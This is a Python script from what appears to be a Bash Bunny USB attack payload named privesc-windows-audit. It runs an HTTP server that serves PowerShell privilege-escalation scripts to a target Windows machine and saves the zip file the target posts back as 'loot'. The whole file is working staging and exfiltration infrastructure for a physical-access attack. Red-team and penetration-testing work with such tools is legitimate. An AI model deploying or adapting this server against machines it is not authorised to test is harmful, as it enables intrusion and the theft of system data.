#!/usr/bin/env python3
"""
Bash Bunny — privesc-windows-audit / receive.py
Description : Combined HTTP server for the privesc-windows-audit payload.
              GET  /                      → serves files from --serve-dir
              POST /upload                → saves body as privesc_audit.zip
                                           in --loot-dir

Usage:
    python3 receive.py [--serve-dir DIR] [--loot-dir DIR] [--port PORT]

Defaults:
    --serve-dir  ./serve   (place PrivescAudit-Windows.ps1 + runner.ps1 here)
    --loot-dir   /loot/privesc-windows-audit
    --port       80
"""

import argparse
import http.server
import os
import sys
from datetime import datetime

def parse_args():
    p = argparse.ArgumentParser()
    p.add_argument('--serve-dir', default=os.path.join(os.path.dirname(__file__), 'serve'))
    p.add_argument('--loot-dir',  default='/loot/privesc-windows-audit')
    p.add_argument('--port',      type=int, default=80)
    return p.parse_args()

ARGS = parse_args()
os.makedirs(ARGS.serve_dir, exist_ok=True)
os.makedirs(ARGS.loot_dir,  exist_ok=True)

class Handler(http.server.BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        ts = datetime.now().strftime('%H:%M:%S')
        print(f'[{ts}] {self.client_address[0]} — {fmt % args}')

    def do_GET(self):
        path = self.path.lstrip('/')
        if not path:
            path = 'index.html'
        target = os.path.realpath(os.path.join(ARGS.serve_dir, path))
        # Prevent path traversal
        if not target.startswith(os.path.realpath(ARGS.serve_dir)):
            self.send_error(403)
            return
        if not os.path.isfile(target):
            self.send_error(404, f'Not found: {path}')
            return
        with open(target, 'rb') as f:
            data = f.read()
        self.send_response(200)
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        outfile = os.path.join(ARGS.loot_dir, 'privesc_audit.zip')
        with open(outfile, 'wb') as f:
            f.write(body)
        print(f'[+] Loot saved → {outfile} ({len(body):,} bytes)')
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

if __name__ == '__main__':
    print(f'[*] Serving files from : {ARGS.serve_dir}')
    print(f'[*] Saving loot to     : {ARGS.loot_dir}')
    print(f'[*] Listening on       : 0.0.0.0:{ARGS.port}')
    print()
    srv = http.server.HTTPServer(('0.0.0.0', ARGS.port), Handler)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print('\n[+] Server stopped.')
        sys.exit(0)
